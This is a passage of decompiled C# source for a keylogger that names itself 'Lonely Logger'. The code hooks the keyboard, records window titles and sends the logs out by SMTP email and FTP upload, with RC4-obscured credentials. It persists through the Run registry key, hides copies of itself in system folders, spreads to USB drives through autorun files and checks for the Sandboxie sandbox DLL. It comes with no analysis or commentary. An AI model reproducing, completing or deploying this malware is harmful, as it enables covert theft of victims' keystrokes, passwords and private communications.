        message.Body = this.dSai89gbJkSU4b1WW9CW;
label_10:
        num3 = 11;
        SmtpClient smtpClient = new SmtpClient(this.gQ6Lln84OP3I0l41ZEpn);
label_11:
        num3 = 12;
        smtpClient.Port = Conversions.ToInteger(this.dR7hJ9OQR8JuLX60TqOp);
label_12:
        num3 = 13;
        smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.drCpFfKGVlcmm4BbWDaB, this.LzH8BeS1gYj0xcWTXZsd);
label_13:
        num3 = 14;
        smtpClient.EnableSsl = true;
label_14:
        num3 = 15;
        smtpClient.Send(message);
label_15:
        num3 = 16;
        this.dSai89gbJkSU4b1WW9CW = (string) null;
        goto label_22;
label_17:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_22;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_17;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_22:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.cEhQYpIOzoNaFpKaefSd, this.GetActiveWindowTitle(), false) != 0 && Operators.CompareString(this.GetActiveWindowTitle(), "", false) != 0)
      {
        this.dSai89gbJkSU4b1WW9CW = this.dSai89gbJkSU4b1WW9CW + "===[" + this.GetActiveWindowTitle() + "]===\r\n";
        this.cEhQYpIOzoNaFpKaefSd = this.GetActiveWindowTitle();
      }
      this.Hide();
      this.Visible = false;
    }

    private void Timer3_Tick(object sender, EventArgs e)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        string text1 = this.extensions1.Text;
label_2:
        num3 = 3;
        this.iAs34n4atf4AnzG71Bgw = Form1.rc4(text1, "qwerty");
label_3:
        num3 = 4;
        string text2 = this.extensions2.Text;
label_4:
        num3 = 5;
        this.a6zPFCgoeSCFtcbDB2qJl = Form1.rc4(text2, "qwerty1");
label_5:
        num3 = 6;
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create("ftp://" + this.SzLWEQQH9aoPrufxF5RC + "/Lonely Logger Public Version 1.0 Logs" + this.UxNMTN2VJWMHohFePcTT + ".txt");
label_6:
        num3 = 7;
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(this.iAs34n4atf4AnzG71Bgw, this.a6zPFCgoeSCFtcbDB2qJl);
label_7:
        num3 = 8;
        ftpWebRequest.Method = "STOR";
label_8:
        num3 = 9;
        string sai89gbJkSu4b1Ww9Cw = this.dSai89gbJkSU4b1WW9CW;
label_9:
        num3 = 10;
        FileStream fileStream = new FileStream("C:\\WINDOWS\\system32\\" + this.UxNMTN2VJWMHohFePcTT, FileMode.Create, FileAccess.Write);
label_10:
        num3 = 11;
        StreamWriter streamWriter = new StreamWriter((Stream) fileStream);
label_11:
        num3 = 12;
        streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
label_12:
        num3 = 13;
        streamWriter.WriteLine(sai89gbJkSu4b1Ww9Cw);
label_13:
        num3 = 14;
        streamWriter.Close();
label_14:
        num3 = 15;
        byte[] buffer = System.IO.File.ReadAllBytes("C:\\WINDOWS\\system32\\" + this.UxNMTN2VJWMHohFePcTT);
label_15:
        num3 = 16;
        Stream requestStream = ftpWebRequest.GetRequestStream();
label_16:
        num3 = 17;
        requestStream.Write(buffer, 0, buffer.Length);
label_17:
        num3 = 18;
        requestStream.Close();
label_18:
        num3 = 19;
        requestStream.Dispose();
label_19:
        num3 = 20;
        FileSystem.SetAttr("C:\\WINDOWS\\system32\\" + this.UxNMTN2VJWMHohFePcTT, FileAttribute.Hidden);
label_20:
        num3 = 21;
        this.UxNMTN2VJWMHohFePcTT = Conversions.ToString(Conversions.ToDouble(this.UxNMTN2VJWMHohFePcTT) + 1.0);
        goto label_27;
label_22:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_17;
              case 19:
                goto label_18;
              case 20:
                goto label_19;
              case 21:
                goto label_20;
              case 22:
                goto label_27;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_22;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_27:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    [DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long GetModuleHandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpModuleName);

    private bool PeUvHMK6JhO2FrK2E2PA()
    {
      bool flag;
      try
      {
        string lpModuleName = "SbieDll.dll";
        if (Form1.GetModuleHandle(ref lpModuleName) != 0L)
          flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public static void CLcGej61sAOadow3o7J1(string Name, string Path) => Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Name, (object) Path, RegistryValueKind.String);

    public void XEqcJbhViQGgS7eTUucl(string filename)
    {
      try
      {
        string environmentVariable = Environment.GetEnvironmentVariable("windir");
        if (Operators.CompareString(Application.StartupPath, environmentVariable, false) != 0)
        {
          FileSystem.FileCopy(Application.ExecutablePath, environmentVariable + "\\" + filename);
          FileSystem.SetAttr(environmentVariable + "\\" + this.qweqw545sa4d798wqe, FileAttribute.Hidden);
          Interaction.Shell(environmentVariable + "\\" + filename + " " + Application.ExecutablePath);
          ProjectData.EndApp();
        }
        else
          FileSystem.Kill(Interaction.Command());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void buNcDHzIpxpI8Avedgn1()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "0", RegistryValueKind.DWord);
label_2:
        num3 = 3;
        string[] logicalDrives = Environment.GetLogicalDrives();
label_3:
        num3 = 4;
        int num4 = checked (logicalDrives.Length - 1);
        int index = 0;
        goto label_13;
label_4:
        num3 = 5;
        DriveInfo driveInfo = new DriveInfo(logicalDrives[index]);
label_5:
        num3 = 6;
        if (driveInfo.DriveType != DriveType.Removable)
          goto label_12;
label_6:
        num3 = 7;
        if (!driveInfo.IsReady)
          goto label_12;
label_7:
        num3 = 8;
        if (System.IO.File.Exists(logicalDrives[index] + "yrfevE8hm69TWbOwaMl3.exe"))
          goto label_12;
label_8:
        num3 = 9;
        System.IO.File.Copy(Application.ExecutablePath, logicalDrives[index] + "yrfevE8hm69TWbOwaMl3.exe", true);
label_9:
        num3 = 10;
        MyProject.Computer.FileSystem.WriteAllText(logicalDrives[index] + "shutorun.inf", "[autorun]\r\nopen=" + logicalDrives[index] + "yrfevE8hm69TWbOwaMl3.exe\r\nshellexecute=" + logicalDrives[index], true);
label_10:
        num3 = 11;
        FileSystem.SetAttr(logicalDrives[index] + "yrfevE8hm69TWbOwaMl3.exe", FileAttribute.Hidden);
label_11:
        num3 = 12;
        FileSystem.SetAttr(logicalDrives[index] + "shutorun.inf", FileAttribute.Hidden);
label_12:
        num3 = 16;
        checked { ++index; }
label_13:
        if (index <= num4)
          goto label_4;
        else
          goto label_20;
label_15:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
              case 14:
              case 15:
              case 16:
                goto label_12;
              case 17:
                goto label_20;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_15;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_20:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    protected override void WndProc(ref System.Windows.Forms.Message m)
    {
      if (m.Msg == 537)
        this.a5UX0kmxcNswoXvSb5GVy(ref m);
      base.WndProc(ref m);
    }

    private void a5UX0kmxcNswoXvSb5GVy(ref System.Windows.Forms.Message msg)
    {
      switch ((int) msg.WParam)
      {
        case 32768:
          this.buNcDHzIpxpI8Avedgn1();
          break;
      }
    }

    private void sIfIrAbVM1vlfdT9RJoK()
    {
      Form1.Win32.DEV_BROADCAST_DEVICEINTERFACE structure = new Form1.Win32.DEV_BROADCAST_DEVICEINTERFACE();
      int cb = Marshal.SizeOf((object) structure);
      structure.dbcc_size = cb;
      structure.dbcc_devicetype = 5;
      structure.dbcc_reserved = 0;
      structure.dbcc_classguid = Form1.Win32.GUID_DEVINTERFACE_HID;
      structure.dbcc_name = (short) 0;
      IntPtr num1 = Marshal.AllocHGlobal(cb);
      Marshal.StructureToPtr((object) structure, num1, true);
      int num2 = Form1.Win32.RegisterDeviceNotification(this.Handle, num1, 0) == IntPtr.Zero ? 1 : 0;
    }

    public static string rc4(string message, string esendx666word)
    {
      int index1 = 0;
      int index2 = 0;
      StringBuilder stringBuilder = new StringBuilder();
      string empty = string.Empty;
      int[] numArray1 = new int[257];
      int[] numArray2 = new int[257];
      int length = esendx666word.Length;
      int location1 = 0;
      while (location1 <= (int) byte.MaxValue)
      {
        char String = esendx666word.Substring(location1 % length, 1).ToCharArray()[0];
        numArray2[location1] = Strings.Asc(String);
        numArray1[location1] = location1;
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      int index3 = 0;
      int location2 = 0;
      while (location2 <= (int) byte.MaxValue)
      {
        index3 = checked (index3 + numArray1[location2] + numArray2[location2]) % 256;
        int num = numArray1[location2];
        numArray1[location2] = numArray1[index3];
        numArray1[index3] = num;
        Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
      }
      location1 = 1;
      while (location1 <= message.Length)
      {
        index1 = checked (index1 + 1) % 256;
        index2 = checked (index2 + numArray1[index1]) % 256;
        int num1 = numArray1[index1];
        numArray1[index1] = numArray1[index2];
        numArray1[index2] = num1;
        int num2 = numArray1[checked (numArray1[index1] + numArray1[index2]) % 256];
        int CharCode = Strings.Asc(message.Substring(checked (location1 - 1), 1).ToCharArray()[0]) ^ num2;
        stringBuilder.Append(Strings.Chr(CharCode));
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      string str = stringBuilder.ToString();
      stringBuilder.Length = 0;
      return str;
    }

    public class KeyboardHook
    {
      private const int HC_ACTION = 0;
      private const int WH_KEYBOARD_LL = 13;
      private const int WM_KEYDOWN = 256;
      private const int WM_KEYUP = 257;
      private const int WM_SYSKEYDOWN = 260;
      private const int WM_SYSKEYUP = 261;
      private static int KeyHook;
      private static Form1.KeyboardHook.KeyboardProcDelegate KeyHookDelegate;

      [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int SetWindowsHookEx(
        int idHook,
        Form1.KeyboardHook.KeyboardProcDelegate lpfn,
        int hmod,
        int dwThreadId);

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int CallNextHookEx(
        int hHook,
        int nCode,
        int wParam,
        Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam);

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int UnhookWindowsHookEx(int hHook);

      public static event Form1.KeyboardHook.KeyDownEventHandler KeyDown;

      public static event Form1.KeyboardHook.KeyUpEventHandler KeyUp;

      public KeyboardHook()
      {
        Form1.KeyboardHook.KeyHookDelegate = new Form1.KeyboardHook.KeyboardProcDelegate(Form1.KeyboardHook.KeyboardProc);
        Form1.KeyboardHook.KeyHook = Form1.KeyboardHook.SetWindowsHookEx(13, Form1.KeyboardHook.KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
      }

      private static int KeyboardProc(
        int nCode,
        int wParam,
        ref Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam)
      {
        if (nCode == 0)
        {
          switch (wParam)
          {
            case 256:
            case 260:
              Form1.KeyboardHook.KeyDownEventHandler keyDownEvent = Form1.KeyboardHook.KeyDownEvent;
              if (keyDownEvent != null)
              {
                keyDownEvent((Keys) lParam.vkCode);
                break;
              }
              break;
            case 257:
            case 261:
              Form1.KeyboardHook.KeyUpEventHandler keyUpEvent = Form1.KeyboardHook.KeyUpEvent;
              if (keyUpEvent != null)
              {
                keyUpEvent((Keys) lParam.vkCode);
                break;
              }
              break;
          }
        }
        return Form1.KeyboardHook.CallNextHookEx(Form1.KeyboardHook.KeyHook, nCode, wParam, lParam);
      }

      ~KeyboardHook()
      {
        Form1.KeyboardHook.UnhookWindowsHookEx(Form1.KeyboardHook.KeyHook);
        // ISSUE: explicit finalizer call
        base.Finalize();
      }

      private struct KBDLLHOOKSTRUCT
      {
        public int vkCode;
        public int scancode;
        public int flags;
        public int time;
        public int dwExtraInfo;
      }

      private delegate int KeyboardProcDelegate(
        int nCode,
        int wParam,
        ref Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam);

      public delegate void KeyDownEventHandler(Keys Key);

      public delegate void KeyUpEventHandler(Keys Key);
    }

    public class Win32
    {
      public const int WM_DEVICECHANGE = 537;
      public const int DBT_DEVICEARRIVAL = 32768;
      public const int DBT_DEVICEREMOVECOMPLETE = 32772;
      public const int DEVICE_NOTIFY_WINDOW_HANDLE = 0;
      public const int DEVICE_NOTIFY_SERVICE_HANDLE = 1;
      public const int DBT_DEVTYP_DEVICEINTERFACE = 5;
      public static Guid GUID_DEVINTERFACE_HID = new Guid("4D1E55B2-F16F-11CF-88CB-001111000030");

      [DebuggerNonUserCode]
      public Win32()
      {
      }

      public static IntPtr RegisterDeviceNotification(
        IntPtr hRecipient,
        IntPtr NotificationFilter,
        int Flags)
      {
        IntPtr num;
        return num;
      }

      public static int GetLastError()
      {
        int lastError;
        return lastError;
      }

      public class DEV_BROADCAST_DEVICEINTERFACE
      {
        public int dbcc_size;
        public int dbcc_devicetype;
        public int dbcc_reserved;
        public Guid dbcc_classguid;
        public short dbcc_name;

        [DebuggerNonUserCode]
        public DEV_BROADCAST_DEVICEINTERFACE()
        {
        }
      }
    }
  }
}
